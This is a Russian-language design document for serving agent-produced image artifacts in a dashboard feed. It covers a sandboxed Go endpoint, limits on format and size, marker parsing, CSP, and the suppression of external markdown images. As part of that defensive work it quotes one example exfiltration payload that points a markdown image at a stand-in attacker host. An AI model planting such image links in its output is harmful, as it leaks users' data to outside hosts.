# План: показать в фиде картинку, произведённую агентом (agent → user)

> **Статус: РЕАЛИЗОВАНО (2026-09-19).** Это исторический дизайн-документ. Живущая
> реализация прошла ещё два раунда codex-ревью ПОСЛЕ написания этого плана, и в
> нескольких местах шипнутый код НАМЕРЕННО отличается от текста ниже — код является
> источником истины, не этот документ. Ключевые расхождения (шипнутое побеждает):
> - **Песочница артефактов:** `os.Root` пинится на `s.runDir`, а путь открывается
>   как `<id>/artifacts/<name>` ЧЕРЕЗ него — иначе `os.OpenRoot(<…>/artifacts)`
>   пошёл бы по symlink самого каталога наружу (раздел «Backend» ниже описывает
>   старый, уязвимый вариант). `pkg/server/artifacts.go`.
> - **Кэш:** `Cache-Control: private, no-cache` + `ETag` (НЕ `immutable` — то же имя
>   перезаписывается на retry/revision).
> - **Детекция кода для маркеров:** через токены markdown-it (`codeBlockLineRanges`),
>   а не ручной backtick-сканер — корректно исключает indented code и `~~~`.
> - **Рендер сегментов:** обёрнуты в колоночный `.feed-item-segments` (иначе легли бы
>   в flex-ряд рядом с таймстампом).
> - **Глушение внешних картинок:** пропускаем любую относительную ссылку
>   (`images/x.png`, `./x`, `../x`), глушим только явную схему и `//host`.
> - **CSP:** `img-src 'self' data: blob:` (blob: — превью вставленной картинки),
>   реализована в `serveIndex`.
> Итоговое поведение и границы — см. CHANGELOG (2026-09-19) и `docs/dashboard.md`.

Статус (исходный, на момент проектирования): спроектировано, не реализовано. Дизайн
прошёл критический ревью через codex; все crit/bug из ревью учтены (см. раздел «Как
закрыты замечания ревью»).

## Проблема

afm не умеет показать пользователю в ленте изображение, которое произвёл агент.
LLM-агент картинки не генерирует — «картинка от агента» это **файл-изображение**,
который агент создал на диске в ходе работы (график, отрендеренный диаграмм,
скриншот из headless-браузера, скачанный файл). Цель — отобразить такой файл в
фиде, в потоке сообщений стадии.

## Итоговое решение

Ключевая опора: текстовый нарратив агента (`agent_action` с `tool="text"`) уже
доходит до фида **одним и тем же путём** в live (`executor.contentToAction` →
`OnAction`) и в replay (`events_handler.reconstructAgentActions` →
`executor.ParseToolAction` → тот же `contentToAction`), и **не обрезается**. Значит
новый FSM-event/тип не нужен — ссылка на картинку едет внутри существующего
текстового сообщения. Это согласуется с правилом «single canonical decision point»
(live/replay не разъедутся — путь один) и «Always Prefer Simplicity».

Но ссылка указывает **не на произвольный путь**, а на **атомарно опубликованный
immutable-артефакт стадии**, адресуемый парой `stageID + имя` (без абсолютного пути
от клиента). Сервер отдаёт байты только из каталога артефактов этой стадии,
fd-безопасно, со строгими лимитами и immutable-кэшем. Фронт сегментирует текст по
standalone-маркерам и рендерит `<img>` с same-origin `src`, который строит сам
фронт (никакого пути/URL из данных агента в атрибут не попадает).

## Контракт агента (протокол публикации артефакта)

- Каталог артефактов стадии: `$AFM_STAGE_DIR/artifacts/` (равно
  `<runDir>/<stageID>/artifacts/`, т.к. `StageDir = filepath.Join(RunDir, s.ID)` —
  `runner_factory.go:61`). `$AFM_STAGE_DIR` уже проброшен всем неинтерактивным
  стадиям (`executor.go:576`).
- Имя артефакта `name`: charset `[A-Za-z0-9._-]+`, без `/`, `\`, без `..`;
  расширение `.png` / `.jpg` / `.jpeg` / `.gif`.
- **Атомарность (закрывает torn read):** агент пишет во временный файл в том же
  каталоге → `fsync` → `rename` в финальное `name` → и **только потом** печатает
  маркер. Маркер появляется в тексте лишь после того, как файл целиком на месте.
- Маркер — **отдельной строкой**: `[AFM image: <name>]`. Несколько картинок —
  несколько строк.

## Backend

### Эндпоинт `GET /api/stages/{id}/artifacts/{name}`

Новый файл `pkg/server/artifacts.go`; диспетч в `routeStages` (`server.go:330`).
`routeStages` матчит по `HasSuffix`, а тут суффикс — имя файла, поэтому ветка идёт
по `Contains`:

```go
case strings.Contains(path, "/artifacts/") && r.Method == http.MethodGet:
    s.handleArtifact(w, r)
```

(Существующая ветка `/attachments` POST остаётся выше и не конфликтует — у неё
суффикс ровно `/attachments`.)

Алгоритм `handleArtifact` (единый ответ 404 на все «не найдено/не доступно», без
утечки сырых fs-ошибок и путей):

1. Только GET (иначе 405; фактически уже отфильтровано веткой роутера).
2. Распарсить `id` и `name` из пути. `isValidStageID(id)` (рядом с существующими в
   `handlers.go:837`) → иначе 400. Новый `isValidArtifactName(name)`: непустое,
   соответствует `^[A-Za-z0-9._-]+$`, не содержит `..` → иначе 404.
3. `dir := filepath.Join(s.runDir, id, "artifacts")`.
   `root, err := os.OpenRoot(dir)` (go 1.26.4 — доступно, кросс-платформенно:
   работает и на host-macOS, и в Docker-Linux, в отличие от Linux-only openat2 из
   `pkg/server/workspace`). Нет каталога → 404. `defer root.Close()`.
4. `f, err := root.Open(name)` — доступ **относительно закреплённого fd** root.
   Любой symlink-компонент, ведущий за пределы root, `os.Root` отвергает сам →
   404. **TOCTOU закрыт**: весь путь резолвится и открывается относительно
   зафиксированного каталога, без «EvalSymlinks → проверка префикса → повторный
   open». `defer f.Close()`.
5. `fi, err := f.Stat()`: не regular file → 404; `fi.Size() > maxArtifactBytes`
   (10 MiB, зеркало `maxAttachmentBytes`) → 413.
6. `cfg, format, err := image.DecodeConfig(f)` (с blank-импортами
   `image/png`, `image/jpeg`, `image/gif`): формат ∈ {`png`,`jpeg`,`gif`} — иначе
   415 (SVG исключён by construction — его нет в списке, а значит и XSS через SVG
   невозможен). `cfg.Width > maxDim || cfg.Height > maxDim` (8192) → 413
   (анти-декомпресс-бомба; DecodeConfig читает только заголовок, дёшево). Затем
   `f.Seek(0, io.SeekStart)`.
7. Заголовки: `Content-Type` из подтверждённого `format` (не из расширения/имени);
   `X-Content-Type-Options: nosniff`; `Cross-Origin-Resource-Policy: same-origin`;
   `Referrer-Policy: no-referrer`; `Cache-Control: private, max-age=31536000,
   immutable` (артефакт immutable — уникальное имя, атомарная публикация);
   `ETag` (hex от `name|size|mtime`).
8. Тело отдаётся через `http.ServeContent(w, r, name, fi.ModTime(), f)` — он сам
   корректно обслуживает `If-None-Match`/`If-Modified-Since` (→ 304) и Range, а
   выставленный нами `Content-Type` не переопределяет.

Конфиг сервера **не меняется** — `s.runDir` уже есть (`server.go:74`). Никакого
project-root: адресация только `runDir + stageID + name`, поэтому проблема
«пустой `flow.root_dir` = наследование CWD, а не afm-root» здесь не возникает
вовсе.

Про сетевой bind: эндпоинт отдаёт **только** те картинки, которые сама стадия
опубликовала как артефакты, — тот же уровень доверия, что и остальной дашборд
(фид, план, диалоги, `/api/events` уже полностью читаемы каждым, кто дотянулся до
порта). Произвольного чтения ФС больше нет, поэтому LAN-экспозиция не расширяется
относительно уже существующей поверхности, и менять дефолтный host-bind
(`:port`, все интерфейсы — `server.go:253`) не требуется. Это осознанное решение:
crit ревью был про *произвольное* чтение, оно устранено адресацией по
opaque-имени в песочнице стадии.

DoS: каждый GET дёшев (header-only `DecodeConfig` + `io.Copy` ≤10 MiB). Число
картинок в одном сообщении ограничивается на фронте (cap N, см. ниже) — это же
ограничивает и число параллельных GET, порождённых одним сообщением. Отдельный
rate-limit не вводим: артефакты не тяжелее уже нелимитированного `/api/events`.

## Frontend

### Сегментация текста по маркерам

Новый helper `split-image-markers.ts` в `feed-workspace/`:
`splitImageMarkers(text): Segment[]`, где `Segment = {type:'md', text} | {type:'img',
name}`. Построчный проход с отслеживанием fenced-блоков (переключатель по строкам,
начинающимся с ```` ``` ````, — как уже делает `splitAndRender` в `markdown.ts`):
- Строка **вне кода**, целиком (после trim) равная `[AFM image: <name>]` c
  валидным `name` (тот же charset `^[A-Za-z0-9._-]+$`) → граница img-сегмента.
- Всё остальное (в т.ч. маркер внутри fenced-блока, или маркер посреди строки,
  или невалидное имя) → остаётся обычным md-текстом и рендерится как есть.
- Cap: не более `MAX_FEED_IMAGES` (напр. 20) img-сегментов на сообщение; сверх —
  остаются текстом. Закрывает «одно сообщение порождает сотни GET/декодирований».

### Рендер (`FeedWorkspace.tsx`, `FeedGroupView`)

Для markdown-сообщения (`item.markdown === true`) вместо одного
`dangerouslySetInnerHTML` по всему тексту: прогнать `item.text` через
`splitImageMarkers` и отрисовать сегменты по порядку:
- `md`-сегмент → `<div className="feed-item-text md"
  dangerouslySetInnerHTML={{__html: renderPlainMarkdown(seg.text)}} />` (как сейчас).
- `img`-сегмент → настоящий React-элемент:
  ```tsx
  <img
    className="feed-image"
    src={`/api/stages/${encodeURIComponent(item.stageId)}/artifacts/${encodeURIComponent(seg.name)}`}
    loading="lazy"
    alt="agent image"
    onError={/* backoff-ретрай 2–3 раза */}
  />
  ```
  `src` целиком строит фронт из `item.stageId` и `seg.name` через
  `encodeURIComponent` — **никакой строки из данных агента в атрибут напрямую не
  попадает**, инъекции нет.
- `onError`-ретрай (короткий backoff, 2–3 попытки) — defense-in-depth поверх
  атомарного контракта на случай live-гонки (маркер прочитан на миг раньше, чем
  файл виден серверу).

### Глушение внешних markdown-картинок (закрывает pre-existing exfil)

Сейчас `renderPlainMarkdown` (`markdown.ts`, `markdown-it` c `html:false`) всё ещё
превращает `![](https://attacker/?leak)` в внешний `<img>` — это существующий канал
эксфильтрации из текста агента, не связанный с новой фичей, но раз мы трогаем этот
рендерер — закрываем. Переопределить правило `image` у экземпляра `md`: если `src`
не same-origin/относительный (не начинается с `/`) — не эмитить `<img>`, оставить
alt-текст. (Экземпляр `md` общий для плана и ленты — плану внешние картинки тоже не
нужны, поэтому правим общий, это безопаснее.)

### CSP (defense-in-depth)

Добавить заголовок `Content-Security-Policy` на отдачу дашборда (`serveStatic`/
index, `server.go:296`) минимум с `img-src 'self' data:` (`data:` — favicon) и
`default-src 'self'`, `connect-src 'self'` (+ `ws:`/`wss:` для `/ws`).
**Обязательно** свериться с фактическими inline-скриптами `index.html` перед
включением `script-src`: если inline-скрипты есть — использовать hash/nonce либо
временно `script-src 'unsafe-inline'` (не ослабляя `img-src`). CSP делает
renderer-глушилку избыточной как второй рубеж, но оставляем оба. Если согласование
`script-src` окажется рискованным для SPA — CSP можно отложить: жёсткий рубеж от
внешних картинок уже даёт renderer-правило.

### CSS

`pkg/web/dashboard/skins/base/feed-workspace.css` (источник — именно `skins/`, не
`src/skins`; `public/skins` генерируется `sync-skins.js`):
```css
.feed-bubble img.feed-image { max-width: 100%; height: auto; display: block;
  border-radius: var(--radius-sm); }
```

## Prompt (в этой же фазе — producer и protocol вместе)

`pkg/prompts/builder.go`: добавить в системный промпт блок с контрактом: «чтобы
показать картинку пользователю в ленте — атомарно сохрани её в
`$AFM_STAGE_DIR/artifacts/<name>.png` (временный файл → rename) и напиши отдельной
строкой `[AFM image: <name>.png]`». Так у маркера с первой же фазы есть штатный
producer, а публикация атомарна по инструкции.

## Тесты

Backend (`pkg/server/artifacts_test.go`):
- happy path png/jpeg/gif → 200, корректный `Content-Type`, заголовки на месте;
- non-GET → 405; невалидный `stageID` → 400;
- `name` с `..` / `/` / вне charset → 404;
- symlink внутри `artifacts/`, ведущий наружу → `os.Root` отвергает → 404;
- нет каталога/файла → 404;
- не-image (текстовый файл с расширением `.png`) → 415;
- размер > 10 MiB → 413; размеры > 8192px → 413;
- `If-None-Match` с тем же ETag → 304.

Frontend:
- `splitImageMarkers`: 0/1/N маркеров; маркер внутри code-fence → остаётся текстом;
  маркер посреди строки → текст; невалидное имя → текст; cap N (лишние — текст);
- рендер img-сегмента с ожидаемым `src`; `onError`-ретрай;
- внешняя markdown-картинка `![](http://…)` **не** создаёт внешний `<img>`;
- набор «злых» имён (`%`, `&`, `#`, `?`, `"`, `<`, control-символы) — либо
  отвергается валидатором как текст, либо безопасно уходит в `encodeURIComponent`;
  доказать, что SVG-формат никогда не принимается бэкендом.

## Как закрыты замечания ревью codex

- **crit: произвольное чтение файла по HTTP** → адресация только `stageID + opaque
  name` в песочнице `runDir/<stage>/artifacts`; MIME больше не «авторизация», а
  дополнительная проверка. Клиент не передаёт путь.
- **crit: TOCTOU у EvalSymlinks+prefix** → `os.OpenRoot` + `root.Open(name)`:
  fd-relative доступ, symlink-escape отвергается ядром/рантаймом, повторного
  резолва пути нет.
- **crit: нет CSP / внешние markdown-картинки** → renderer-правило глушит внешние
  `<img>` (обязательный рубеж) + CSP `img-src 'self' data:` (defense-in-depth).
- **crit: host слушает все интерфейсы** → устранено первопричинно: произвольного
  чтения нет, поверхность = уже существующий дашборд; bind не трогаем (осознанно).
- **bug: live/replay расходятся по байтам** → артефакт immutable (уникальное имя,
  атомарная публикация); run-dir и есть durable snapshot, replay читает тот же
  файл.
- **bug: torn read** → контракт temp→fsync→rename→маркер; сервер отдаёт только
  финальный файл; `DecodeConfig` отвергнет частичный; UI-ретрай как страховка.
- **bug: LimitReader молча усекает** → размер проверяется через `fi.Size()` до
  отдачи, возвращаем 413; тело отдаёт `ServeContent` целиком.
- **bug: DetectContentType/бомбы** → точный allowlist через `DecodeConfig` (формат
  + лимиты ширины/высоты), без SVG.
- **bug: неогранич. маркеры/параллельные GET** → cap N на сообщение на фронте.
- **bug: неверный fallback project-root** → project-root не используется вовсе.
- **bug: regex не учитывает семантику путей/code fences** → имя, а не путь
  (простой charset, без кавычек/экранирования); маркер только отдельной строкой
  вне кода.
- **bug: кэш не определён** → `Cache-Control: immutable` + `ETag` (артефакт
  immutable).
- **bug: prompt как «фаза 2»** → prompt в этой же фазе, producer с первого дня.
- **nit: слабые XSS-тесты** → расширенный набор злых имён + доказательство отказа
  SVG.
- **nit: доп. заголовки** → CORP, Referrer-Policy, явный Cache-Control добавлены.
- **nit: путь CSS** → `pkg/web/dashboard/skins/base/feed-workspace.css`.

## Что НЕ делаем (осознанно)

- Не парсим настоящие image-блоки stream-json / `tool_result` (`type:"user"`) — LLM
  их почти не шлёт, сложность высокая; отдельная фаза при реальной потребности.
- Не добавляем `webp` — нет зависимости `golang.org/x/image` (её `DecodeConfig` для
  webp); добавление dep вне объёма. Начинаем с png/jpeg/gif (stdlib).
- Не меняем `go.mod`, дефолтный bind, FSM/event-модель.

## Затронутые файлы

- NEW `pkg/server/artifacts.go`, `pkg/server/artifacts_test.go`
- `pkg/server/server.go` — ветка `/artifacts/` в `routeStages`; (опц.) CSP в
  `serveStatic`
- `pkg/server/handlers.go` — `isValidArtifactName` рядом с `isValidStageID`
- `pkg/prompts/builder.go` — контракт маркера в системном промпте
- NEW `pkg/web/dashboard/src/components/feed-workspace/split-image-markers.ts`
  (+ тест)
- `pkg/web/dashboard/src/components/feed-workspace/FeedWorkspace.tsx` — рендер
  сегментов
- `pkg/web/dashboard/src/components/plan-panel/markdown.ts` — глушение внешних
  `image`
- `pkg/web/dashboard/skins/base/feed-workspace.css` — стиль `.feed-image`
